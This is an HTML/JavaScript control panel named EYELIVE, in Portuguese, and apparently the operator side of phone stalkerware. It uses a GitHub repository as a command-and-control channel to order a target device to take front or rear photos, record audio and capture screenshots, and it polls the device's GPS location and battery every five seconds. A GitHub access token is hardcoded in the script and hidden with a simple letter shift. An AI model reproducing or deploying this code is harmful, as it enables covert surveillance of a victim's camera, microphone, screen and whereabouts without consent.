<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0">
    <title>EYELIVE - Monitoramento</title>
    <style>
        :root{--bg:#0a0a0f;--card:#111122;--gold:#ffd700;--green:#00ff88;--red:#ff4444;--text:#e0e0e0;--sub:#888}
        *{margin:0;padding:0;box-sizing:border-box}
        body{background:var(--bg);color:var(--text);font-family:'Segoe UI',system-ui,sans-serif;min-height:100vh;padding:15px}
        .container{max-width:500px;margin:0 auto}
        .header{background:#000;padding:20px;text-align:center;border-bottom:2px solid var(--gold);border-radius:15px 15px 0 0}
        .header h1{color:var(--gold);font-size:1.5em;letter-spacing:3px}
        .header .status{color:var(--green);font-size:.8em;margin-top:5px}
        
        .search-box{background:var(--card);padding:20px;margin:0 0 20px;border:1px solid #222;border-radius:0 0 15px 15px}
        input{width:100%;padding:15px;background:#000;border:1px solid #333;color:#fff;border-radius:10px;font-size:1em;text-align:center;margin:8px 0}
        .btn{width:100%;padding:14px;border:none;border-radius:10px;font-weight:bold;cursor:pointer;font-size:1em;margin:5px 0;text-transform:uppercase;letter-spacing:1px}
        .btn-gold{background:var(--gold);color:#000}
        .btn-green{background:var(--green);color:#000}
        .btn-red{background:var(--red);color:#fff}
        .btn-out{background:transparent;border:1px solid var(--gold);color:var(--gold)}
        
        .card{background:var(--card);border:1px solid #222;border-radius:15px;padding:20px;margin:15px 0}
        .card h3{color:var(--gold);font-size:.9em;margin-bottom:10px;display:flex;align-items:center;gap:8px}
        .info-grid{display:grid;grid-template-columns:1fr 1fr;gap:10px}
        .info-item{background:#000;padding:12px;border-radius:10px;text-align:center}
        .info-item .label{color:var(--sub);font-size:.7em;text-transform:uppercase;letter-spacing:1px}
        .info-item .value{color:#fff;font-size:1.4em;font-weight:bold;margin-top:5px}
        .info-item .value.big{font-size:2em;color:var(--green)}
        
        .media-box{background:#000;border:1px solid #222;border-radius:10px;padding:10px;margin:10px 0;min-height:100px;display:flex;align-items:center;justify-content:center;color:#333}
        .media-box img{width:100%;border-radius:8px}
        .media-box audio{width:100%}
        
        .action-grid{display:grid;grid-template-columns:1fr 1fr;gap:8px}
        
        .pulse{display:inline-block;width:10px;height:10px;background:var(--green);border-radius:50%;animation:pulse 1.5s infinite;margin-right:5px}
        @keyframes pulse{0%,100%{opacity:1}50%{opacity:.3}}
        
        .footer{text-align:center;padding:20px;color:#555;font-size:.7em}
    </style>
</head>
<body>
<div class="container">
    <div class="header">
        <h1>EYELIVE</h1>
        <p class="status" id="connectionStatus">Desconectado</p>
    </div>
    
    <div class="search-box">
        <input type="text" id="key" placeholder="🔑 CHAVE do dispositivo">
        <button class="btn btn-gold" onclick="conectar()">🔍 CONECTAR</button>
    </div>
    
    <div id="dashboard" style="display:none">
        <!-- INFO -->
        <div class="card">
            <h3>📊 Informações do Dispositivo</h3>
            <div class="info-grid">
                <div class="info-item"><div class="label">🔋 Bateria</div><div class="value big" id="bateria">--</div></div>
                <div class="info-item"><div class="label">🕐 Atualizado</div><div class="value" id="time" style="font-size:1em">--</div></div>
                <div class="info-item"><div class="label">📍 Latitude</div><div class="value" id="lat" style="font-size:.9em">--</div></div>
                <div class="info-item"><div class="label">📍 Longitude</div><div class="value" id="lng" style="font-size:.9em">--</div></div>
            </div>
        </div>
        
        <!-- MÍDIA -->
        <div class="card">
            <h3>📸 Captura</h3>
            <div class="media-box" id="mediaResult">Clique em um botão abaixo</div>
        </div>
        
        <!-- AÇÕES -->
        <div class="action-grid">
            <button class="btn btn-green" onclick="cmd('foto_frontal')">📸 Frontal</button>
            <button class="btn btn-green" onclick="cmd('foto_traseira')">📸 Traseira</button>
            <button class="btn btn-red" onclick="cmd('audio')">🎤 Áudio</button>
            <button class="btn btn-out" onclick="cmd('screenshot')">📱 Tela</button>
        </div>
        <button class="btn btn-gold" onclick="cmd('status')" style="margin-top:5px">🔄 ATUALIZAR</button>
    </div>
    
    <div class="footer">EYELIVE v2.0</div>
</div>

<script>
function decToken(){
    var t="now_GrNCw79zDXH35E5ZpTii6RA9bDf4yY3Zf6Da";var r="";
    for(var i=0;i<t.length;i++){
        var c=t[i];
        if(c.match(/[a-zA-Z]/)){var b=c===c.toUpperCase()?65:97;r+=String.fromCharCode((c.charCodeAt(0)-b-7+26)%26+b)}
        else{r+=c}
    }
    return r;
}
var T=decToken(),H={'Authorization':'token '+T,'Accept':'application/vnd.github.v3+json'},KEY='',B='https://api.github.com/repos/gynbetfc/eyelive/contents';
var statusInterval=null;

async function conectar(){
    KEY=document.getElementById('key').value.trim();
    if(!KEY){alert('Cole a chave!');return}
    var ok=await loadStatus();
    if(ok){
        document.getElementById('dashboard').style.display='block';
        document.getElementById('connectionStatus').innerHTML='<span class="pulse"></span>Conectado';
        document.getElementById('connectionStatus').style.color='var(--green)';
        if(statusInterval)clearInterval(statusInterval);
        statusInterval=setInterval(loadStatus,5000);
        localStorage.setItem('ek',KEY);
    }
}

async function loadStatus(){
    try{
        var r=await fetch(B+'/dados/'+KEY+'/status.json',{headers:H});
        if(!r.ok){document.getElementById('connectionStatus').innerHTML='Offline';return false}
        var d=JSON.parse(atob((await r.json()).content));
        document.getElementById('bateria').textContent=d.bateria||'?';
        document.getElementById('time').textContent=d.time||'?';
        if(d.gps){
            document.getElementById('lat').textContent=(d.gps.lat||0).toFixed(4);
            document.getElementById('lng').textContent=(d.gps.lng||0).toFixed(4);
        }
        return true;
    }catch(e){return false}
}

async function cmd(c){
    document.getElementById('mediaResult').innerHTML='⏳ Aguardando...';
    try{
        var data={cmd:c},content=btoa(JSON.stringify(data));
        var url=B+'/comandos/'+KEY+'.json';
        var check=await fetch(url,{headers:H});
        var body={message:'CMD',content:content,branch:'main'};
        if(check.ok)body.sha=(await check.json()).sha;
        await fetch(url,{method:'PUT',headers:H,body:JSON.stringify(body)});
        
        await new Promise(r=>setTimeout(r,12000));
        var resp=await fetch(B+'/dados/'+KEY,{headers:H});
        if(resp.ok){
            var files=await resp.json();
            for(var i=files.length-1;i>=0;i--){
                if(files[i].name.includes('r_')||files[i].name.includes(c)){
                    var rd=await fetch(files[i].url,{headers:H});
                    var d=JSON.parse(atob((await rd.json()).content));
                    if(d.result&&d.result.length>100){
                        if(c.includes('foto')||c.includes('screen'))document.getElementById('mediaResult').innerHTML='<img src="data:image/'+(c.includes('screen')?'png':'jpeg')+';base64,'+d.result+'">';
                        else if(c=='audio')document.getElementById('mediaResult').innerHTML='<audio controls src="data:audio/aac;base64,'+d.result+'"></audio>';
                    }else{document.getElementById('mediaResult').textContent='Resposta: '+JSON.stringify(d)}
                    break;
                }
            }
        }
    }catch(e){document.getElementById('mediaResult').textContent='Erro'}
}

var s=localStorage.getItem('ek');if(s){document.getElementById('key').value=s;conectar();}
</script>
</body>
</html>
